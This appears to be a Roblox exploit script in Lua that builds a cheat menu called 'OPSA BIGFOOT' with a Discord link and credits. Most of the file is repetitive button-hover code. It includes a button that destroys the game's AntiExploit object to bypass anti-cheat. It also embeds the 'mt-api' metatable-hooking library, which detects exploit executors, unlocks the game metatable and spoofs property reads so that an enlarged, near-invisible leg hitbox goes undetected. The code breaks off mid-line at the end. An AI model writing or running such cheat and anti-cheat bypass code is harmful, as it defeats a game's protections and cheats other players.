	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
end
coroutine.wrap(TEQIBW_fake_script)()
local function AMOM_fake_script() -- TextButton_20.LocalScript 
	local script = Instance.new('LocalScript', TextButton_20)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
end
coroutine.wrap(AMOM_fake_script)()
local function SVMRX_fake_script() -- TextButton_21.LocalScript 
	local script = Instance.new('LocalScript', TextButton_21)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(40, 50, 20)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
end
coroutine.wrap(SVMRX_fake_script)()
local function SSWUOAQ_fake_script() -- TextButton_22.LocalScript 
	local script = Instance.new('LocalScript', TextButton_22)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(200, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
end
coroutine.wrap(SSWUOAQ_fake_script)()
local function EDJZFA_fake_script() -- TextButton_23.LocalScript 
	local script = Instance.new('LocalScript', TextButton_23)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	button.MouseButton1Click:Connect(function()
		
	end)
end
coroutine.wrap(EDJZFA_fake_script)()
local function XEHZL_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	script.Parent.Active = true
	script.Parent.Selectable = true
	script.Parent.Draggable = true
	
	
	game:GetService("UserInputService").InputBegan:Connect(function(K,g)
		if g then return end
		if K.KeyCode == Enum.KeyCode.Comma then
			if script.Parent.Visible == true then
				script.Parent.Visible = false
			else
				script.Parent.Visible = true
			end
		end
	end)
	
end
coroutine.wrap(XEHZL_fake_script)()
local function BGJZVR_fake_script() -- TextButton_24.LocalScript 
	local script = Instance.new('LocalScript', TextButton_24)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
end
coroutine.wrap(BGJZVR_fake_script)()
local function PWBN_fake_script() -- TextButton_25.LocalScript 
	local script = Instance.new('LocalScript', TextButton_25)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
end
coroutine.wrap(PWBN_fake_script)()
local function HLSAD_fake_script() -- TextButton_26.LocalScript 
	local script = Instance.new('LocalScript', TextButton_26)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
end
coroutine.wrap(HLSAD_fake_script)()
local function GURYDXZ_fake_script() -- TextButton_27.LocalScript 
	local script = Instance.new('LocalScript', TextButton_27)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
end
coroutine.wrap(GURYDXZ_fake_script)()
local function YNRBEM_fake_script() -- TextButton_28.LocalScript 
	local script = Instance.new('LocalScript', TextButton_28)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
end
coroutine.wrap(YNRBEM_fake_script)()
local function WJLOTGU_fake_script() -- TextButton_29.LocalScript 
	local script = Instance.new('LocalScript', TextButton_29)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	button.MouseButton1Click:Connect(function()
		setclipboard(discord.gg/rj8PXHXmUe)
	end)
end
coroutine.wrap(WJLOTGU_fake_script)()
end)

local Section = Tab:NewSection("UFA Anticheat")
Section:NewButton("Bypass", "ButtonInfo", function()
game:GetService("Workspace").Configuration.AntiExploit:Destroy()
end)

local Section = Tab:NewSection("OPSA BIGFOOT")
Section:NewButton("Execute", "ButtonInfo", function()
-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Main = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local TextButton = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local TextButton_2 = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local TextButton_3 = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local TextButton_4 = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local TextButton_5 = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local TextButton_6 = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local TextButton_7 = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local TextButton_8 = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local TextButton_9 = Instance.new("TextButton")
local UICorner_11 = Instance.new("UICorner")
local TextButton_10 = Instance.new("TextButton")
local UICorner_12 = Instance.new("UICorner")
local TextButton_11 = Instance.new("TextButton")
local UICorner_13 = Instance.new("UICorner")
local TextButton_12 = Instance.new("TextButton")
local UICorner_14 = Instance.new("UICorner")
local TextButton_13 = Instance.new("TextButton")
local UICorner_15 = Instance.new("UICorner")
local TextButton_14 = Instance.new("TextButton")
local UICorner_16 = Instance.new("UICorner")
local Frame_2 = Instance.new("Frame")
local UICorner_17 = Instance.new("UICorner")
local TextButton_15 = Instance.new("TextButton")
local UICorner_18 = Instance.new("UICorner")
local TextButton_16 = Instance.new("TextButton")
local UICorner_19 = Instance.new("UICorner")
local TextButton_17 = Instance.new("TextButton")
local UICorner_20 = Instance.new("UICorner")
local shadowHolder = Instance.new("Frame")
local umbraShadow = Instance.new("ImageLabel")
local penumbraShadow = Instance.new("ImageLabel")
local ambientShadow = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local Credits = Instance.new("Frame")
local UICorner_21 = Instance.new("UICorner")
local TextButton_18 = Instance.new("TextButton")
local UICorner_22 = Instance.new("UICorner")
local TextButton_19 = Instance.new("TextButton")
local UICorner_23 = Instance.new("UICorner")
local TextButton_20 = Instance.new("TextButton")
local UICorner_24 = Instance.new("UICorner")
local TextButton_21 = Instance.new("TextButton")
local UICorner_25 = Instance.new("UICorner")
local TextButton_22 = Instance.new("TextButton")
local UICorner_26 = Instance.new("UICorner")
local TextButton_23 = Instance.new("TextButton")
local UICorner_27 = Instance.new("UICorner")
local Information = Instance.new("Frame")
local UICorner_28 = Instance.new("UICorner")
local TextButton_24 = Instance.new("TextButton")
local UICorner_29 = Instance.new("UICorner")
local TextButton_25 = Instance.new("TextButton")
local UICorner_30 = Instance.new("UICorner")
local TextButton_26 = Instance.new("TextButton")
local UICorner_31 = Instance.new("UICorner")
local TextButton_27 = Instance.new("TextButton")
local UICorner_32 = Instance.new("UICorner")
local TextButton_28 = Instance.new("TextButton")
local UICorner_33 = Instance.new("UICorner")
local TextButton_29 = Instance.new("TextButton")
local UICorner_34 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local UICorner_35 = Instance.new("UICorner")
local TextLabel_4 = Instance.new("TextLabel")
local TextLabel_5 = Instance.new("TextLabel")
local UICorner_36 = Instance.new("UICorner")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global

Frame.Parent = ScreenGui


UICorner.CornerRadius = UDim.new(0, 3)
UICorner.Parent = Frame

Main.Name = "Main"
Main.Parent = Frame
Main.BackgroundColor3 = Color3.fromRGB(1000, 36, 36)
Main.Position = UDim2.new(0.00142349559, 0, 0.274297148, 0)
Main.Size = UDim2.new(0, 0, 0, 0)

UICorner_2.CornerRadius = UDim.new(0, 3)
UICorner_2.Parent = Main

TextButton.Parent = Main
TextButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
TextButton.Position = UDim2.new(0, 800, 50, 70)
TextButton.Size = UDim2.new(0, 213, 0, 70)
TextButton.Font = Enum.Font.GothamBlack
TextButton.Text = "OPSA BIGFOOT"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 20.000

UICorner_3.Parent = TextButton



TextButton_17.Parent = Frame_2
TextButton_17.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TextButton_17.Position = UDim2.new(0.1593981631, 0, 0.30107972, 0)
TextButton_17.Size = UDim2.new(0, 103, 0, 38)
TextButton_17.Font = Enum.Font.GothamBlack
TextButton_17.Text = "Information"
TextButton_17.TextColor3 = Color3.fromRGB(200, 255, 255)
TextButton_17.TextSize = 20.000

UICorner_20.CornerRadius = UDim.new(0, 3)
UICorner_20.Parent = TextButton_17

shadowHolder.Name = "shadowHolder"
shadowHolder.Parent = Frame
shadowHolder.BackgroundTransparency = 0.500
shadowHolder.Size = UDim2.new(1, 0, 0.409638554, 0)
shadowHolder.ZIndex = 5

umbraShadow.Name = "umbraShadow"
umbraShadow.Parent = shadowHolder
umbraShadow.AnchorPoint = Vector2.new(0.5, 0.5)
umbraShadow.BackgroundTransparency = 1.000
umbraShadow.Position = UDim2.new(0.5, 0, 0.5, 3)
umbraShadow.Size = UDim2.new(1, 1, 1, 3)
umbraShadow.Image = "rbxassetid://1316045217"
umbraShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
umbraShadow.ImageTransparency = 0.160
umbraShadow.ScaleType = Enum.ScaleType.Slice
umbraShadow.SliceCenter = Rect.new(10, 10, 118, 118)

penumbraShadow.Name = "penumbraShadow"
penumbraShadow.Parent = shadowHolder
penumbraShadow.AnchorPoint = Vector2.new(0.5, 0.5)
penumbraShadow.BackgroundTransparency = 1.000
penumbraShadow.Position = UDim2.new(0.5, 0, 0.5, 3)
penumbraShadow.Size = UDim2.new(1, 1, 1, 3)
penumbraShadow.Image = "rbxassetid://1316045217"
penumbraShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
penumbraShadow.ImageTransparency = 0.880
penumbraShadow.ScaleType = Enum.ScaleType.Slice
penumbraShadow.SliceCenter = Rect.new(10, 10, 118, 118)

ambientShadow.Name = "ambientShadow"
ambientShadow.Parent = shadowHolder
ambientShadow.AnchorPoint = Vector2.new(0.5, 0.5)
ambientShadow.BackgroundTransparency = 1.000
ambientShadow.Position = UDim2.new(0.501123726, 0, 0.474999994, 3)
ambientShadow.Size = UDim2.new(0.991011322, 3, 1.04999995, 3)
ambientShadow.Image = "rbxassetid://1316045217"
ambientShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
ambientShadow.ImageTransparency = 0.880
ambientShadow.ScaleType = Enum.ScaleType.Slice
ambientShadow.SliceCenter = Rect.new(10, 10, 118, 118)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(-0.0267857146, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 94, 0, 23)
TextLabel.Font = Enum.Font.GothamBold
TextLabel.Text = ""
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 25.000

Credits.Name = "Credits"
Credits.Parent = Frame
Credits.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
Credits.Position = UDim2.new(0, 0, 0.277108431, 0)
Credits.Size = UDim2.new(0, 543, 0, 372)
Credits.Visible = false

UICorner_21.CornerRadius = UDim.new(0, 3)
UICorner_21.Parent = Credits

TextButton_18.Parent = Credits
TextButton_18.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TextButton_18.Position = UDim2.new(0.259970695, 0, 0.0569556877, 0)
TextButton_18.Size = UDim2.new(0, 381, 0, 38)
TextButton_18.Font = Enum.Font.GothamBlack
TextButton_18.Text = "Main dev: David De Gea#4581"
TextButton_18.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_18.TextSize = 14.000

UICorner_22.Parent = TextButton_18

TextButton_19.Parent = Credits
TextButton_19.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TextButton_19.Position = UDim2.new(0.259970695, 0, 0.193665951, 0)
TextButton_19.Size = UDim2.new(0, 381, 0, 38)
TextButton_19.Font = Enum.Font.GothamBlack
TextButton_19.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_19.TextSize = 14.000

UICorner_23.Parent = TextButton_19

TextButton_20.Parent = Credits
TextButton_20.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TextButton_20.Position = UDim2.new(0.260420144, 0, 0.479643464, 0)
TextButton_20.Size = UDim2.new(0, 380, 0, 38)
TextButton_20.Font = Enum.Font.GothamBlack
TextButton_20.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_20.TextSize = 10.000

UICorner_24.Parent = TextButton_20

TextButton_21.Parent = Credits
TextButton_21.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TextButton_21.Position = UDim2.new(0.258578479, 0, 0.33613947, 0)
TextButton_21.Size = UDim2.new(0, 381, 0, 38)
TextButton_21.Font = Enum.Font.GothamBlack
TextButton_21.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_21.TextSize = 14.000

UICorner_25.Parent = TextButton_21

TextButton_22.Parent = Credits
TextButton_22.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TextButton_22.Position = UDim2.new(0.260420144, 0, 0.612421036, 0)
TextButton_22.Size = UDim2.new(0, 380, 0, 38)
TextButton_22.Font = Enum.Font.GothamBlack
TextButton_22.Text = "Join our discord! discord.gg/rj8PXHXmUe"
TextButton_22.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_22.TextSize = 10.000

UICorner_26.Parent = TextButton_22

TextButton_23.Parent = Credits
TextButton_23.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TextButton_23.Position = UDim2.new(0.260420144, 0, 0.739835024, 0)
TextButton_23.Size = UDim2.new(0, 378, 0, 38)
TextButton_23.Font = Enum.Font.GothamBlack
TextButton_23.Text = "Copy Discord Link"
TextButton_23.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_23.TextSize = 14.000

UICorner_27.Parent = TextButton_23

Information.Name = "Information"
Information.Parent = Frame
Information.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
Information.Position = UDim2.new(0, 0, 0.277108431, 0)
Information.Size = UDim2.new(0, 542, 0, 371)
Information.Visible = false

UICorner_28.CornerRadius = UDim.new(0, 3)
UICorner_28.Parent = Information

TextButton_24.Parent = Information
TextButton_24.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TextButton_24.Position = UDim2.new(0.278182626, 0, 0.0569701903, 0)
TextButton_24.Size = UDim2.new(0, 379, 0, 38)
TextButton_24.Font = Enum.Font.GothamBlack
TextButton_24.Text = "Press F for AC"
TextButton_24.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_24.TextSize = 14.000

UICorner_29.Parent = TextButton_24

TextButton_25.Parent = Information
TextButton_25.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TextButton_25.Position = UDim2.new(0.278182626, 0, 0.190948814, 0)
TextButton_25.Size = UDim2.new(0, 379, 0, 38)
TextButton_25.Font = Enum.Font.GothamBlack
TextButton_25.Text = "Scripting Group: Avexcital Scripts"
TextButton_25.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_25.TextSize = 14.000


UICorner_31.Parent = TextButton_26

TextButton_27.Parent = Information
TextButton_27.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TextButton_27.Position = UDim2.new(0.278182626, 0, 0.333371639, 0)
TextButton_27.Size = UDim2.new(0, 379, 0, 38)
TextButton_27.Font = Enum.Font.GothamBlack
TextButton_27.Text = "Comma (,) to close the GUI"
TextButton_27.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_27.TextSize = 14.000



UICorner_34.Parent = TextButton_29

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(-0.0267857146, 0, 0, 0)
TextLabel_2.Size = UDim2.new(0, 94, 0, 23)
TextLabel_2.Font = Enum.Font.GothamBold
TextLabel_2.Text = ""
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 25.000





-- Scripts:

local function EBAYR_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		if getgenv().MTAPIMutex~=nil then return end;local function a()if is_protosmasher_caller~=nil then return 0 end;if elysianexecute~=nil then return 1 end;if fullaccess~=nil then return 2 end;if Synapse~=nil then return 3 end;return 4 end;local function b()local c=a()if c==0 then return is_protosmasher_caller end;if c==1 or c==3 then return checkcaller end;if c==2 then return IsLevel7 end;return nil end;if a()==2 then error("mt-api: Exploit not supported")end;local d={}local e={}local f={}local g={}local h={}local i={}local j={}local k={}local function l()local m=a()local n=b()local o=getrawmetatable(game)if m==0 then make_writeable(o)elseif m==2 then fullaccess(o)else setreadonly(o,false)end;local p=o.__index;local q=o.__newindex;local r=o.__namecall;o.__index=newcclosure(function(s,t)if n()then return p(s,t)end;if d[s]and d[s][t]then local u=d[s][t]if u["IsCallback"]==true then return u["Value"](s)else return u["Value"]end end;if g[t]then local v=g[t]if v["IsCallback"]==true then return v["Value"](s)else return v["Value"]end end;if j[s]and j[s][t]then return k[s][t]end;return p(s,t)end)o.__newindex=newcclosure(function(w,x,y)if n()then return q(w,x,y)end;if e[w]and e[w][x]then local z=e[w][x]if z["Callback"]==nil then return else z["Callback"](w,y)return end end;if h[x]then local A=h[x]if A["Callback"]==nil then return else A["Callback"](w,y)return end end;if j[w]and j[w][x]then local B=j[w][x]if type(y)~=B["Type"]then error("bad argument #3 to '"..x.."' ("..B["Type"].." expected, got "..type(x)..")")end;k[w][x]=y;return end;return q(w,x,y)end)local C=isluau and isluau()or false;o.__namecall=newcclosure(function(D,...)local E={...}local F=C and getnamecallmethod()or table.remove(E)if n()then if F=="AddGetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local G=E[1]local H=E[2]local I=E[3]if type(G)~="string"then error("mt-api: Invalid hook type")end;if not d[D]then d[D]={}end;if I==true and type(H)~="function"then error("mt-api: Invalid callback function")end;d[D][G]={Value=H,IsCallback=I}local J=function()d[D][G]=nil end;return{remove=J,Remove=J}end;if F=="AddGlobalGetHook"then local K=E[1]local L=E[2]local M=E[3]if type(K)~="string"then error("mt-api: Invalid hook type")end;if M==true and type(L)~="function"then error("mt-api: Invalid callback function")end;g[K]={Value=L,IsCallback=M}local N=function()g[K]=nil end;return{remove=N,Remove=N}end;if F=="AddSetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local O=E[1]local P=E[2]if type(O)~="string"then error("mt-api: Invalid hook type")end;if not e[D]then e[D]={}end;if type(P)=="function"then e[D][O]={Callback=P}else e[D][O]={Callback=nil}end;local Q=function()e[D][O]=nil end;return{remove=Q,Remove=Q}end;if F=="AddGlobalSetHook"then if#E<1 then error("mt-api: Invalid argument count")end;local R=E[1]local S=E[2]if type(R)~="string"then error("mt-api: Invalid hook type")end;if type(S)=="function"then h[R]={Callback=S}else h[R]={Callback=nil}end;local T=function()h[R]=nil end;return{remove=T,Remove=T}end;if F=="AddCallHook"then if#E<2 then error("mt-api: Invalid argument count")end;local U=E[1]local V=E[2]if type(U)~="string"then error("mt-api: Invalid hook type")end;if type(V)~="function"then error("mt-api: Invalid argument #2 (not function)")end;if not f[D]then f[D]={}end;f[D][U]={Callback=V}local W=function()f[D][U]=nil end;return{remove=W,Remove=W}end;if F=="AddGlobalCallHook"then if#E<2 then error("mt-api: Invalid argument count")end;local X=E[1]local Y=E[2]if type(X)~="string"then error("mt-api: Invalid hook type")end;if type(Y)~="function"then error("mt-api: Invalid argument #2 (not function)")end;i[X]={Callback=Y}local Z=function()i[X]=nil end;return{remove=Z,Remove=Z}end;if F=="AddPropertyEmulator"then if#E<1 then error("mt-api: Invalid argument count")end;local _=E[1]if type(_)~="string"then error("mt-api: Invalid hook type")end;local a0=p(D,_)local a1=type(a0)if not j[D]then j[D]={}end;if not k[D]then k[D]={}end;j[D][_]={Type=a1}k[D][_]=p(D,_)local a2=function()j[D][_]=nil;k[D][_]=nil end;return{remove=a2,Remove=a2}end;return r(D,...)end;if f[D]and f[D][F]then local a3=f[D][F]return a3["Callback"](p(D,F),unpack(E))end;if i[F]then local a4=i[F]return a4["Callback"](D,p(D,F),unpack(E))end;return r(D,...)end)if m==0 then make_readonly(o)elseif m==2 then else setreadonly(o,true)end end;l()getgenv().MTAPIMutex=true
	
		game.Players.LocalPlayer.Character["Right Leg"]:AddPropertyEmulator("Size")
		wait(0.5)
		game.Players.LocalPlayer.Character["Right Leg"].Massless = true
		game.Players.LocalPlayer.Character["Right Leg"].Size = Vector3.new (12.3, 2.11, 10.2)
		game.Players.LocalPlayer.Character["Right Leg"].Transparency = 0.9
	end)
end
coroutine.wrap(EBAYR_fake_script)()
local function DTNR_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)

	local button = script.Parent
	local ts = game:GetService("TweenService")
	local ti = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In) --you can set that to anything you want
	local tIn = {BackgroundColor3 = Color3.fromRGB(255, 255, 255), TextColor3 = Color3.fromRGB(43, 43, 43)} --colors are up to you
	local tOut = {BackgroundColor3 = Color3.fromRGB(43, 43, 43), TextColor3 = Color3.fromRGB(255, 255, 255)} --colors are up to you
	local createIn = ts:Create(button, ti, tIn) --when mouse ENTERS button
	local createOut = ts:Create(button, ti, tOut) --when mouse LEAVES button
	
	button.MouseEnter:Connect(function()
	
		createIn:Play()
	
	end)
	
	button.MouseLeave:Connect(function()
	
		createOut:Play()
	
	end)
	
	
	
	
	button.MouseButton1Click:Connect(function()
		if getgenv().MTAPIMutex~=nil then return end;local function a()if is_protosmasher_caller~=nil then return 0 end;if elysianexecute~=nil then return 1 end;if fullaccess~=nil then return 2 end;if Synapse~=nil then return 3 end;return 4 end;local function b()local c=a()if c==0 then return is_protosmasher_caller end;if c==1 or c==3 then return checkcaller end;if c==2 then return IsLevel7 end;return nil end;if a()==2 then error("mt-api: Exploit not supported")end;local d={}local e={}local f={}local g={}local h={}local i={}local j={}local k={}local function l()local m=a()local n=b()local o=getrawmetatable(game)if m==0 then make_writeable(o)elseif m==2 then fullaccess(o)else setreadonly(o,false)end;local p=o.__index;local q=o.__newindex;local r=o.__namecall;o.__index=newcclosure(function(s,t)if n()then return p(s,t)end;if d[s]and d[s][t]then local u=d[s][t]if u["IsCallback"]==true then return u["Value"](s)else return u["Value"]end end;if g[t]then local v=g[t]if v["IsCallback"]==true then return v["Value"](s)else return v["Value"]end end;if j[s]and j[s][t]then return k[s][t]end;return 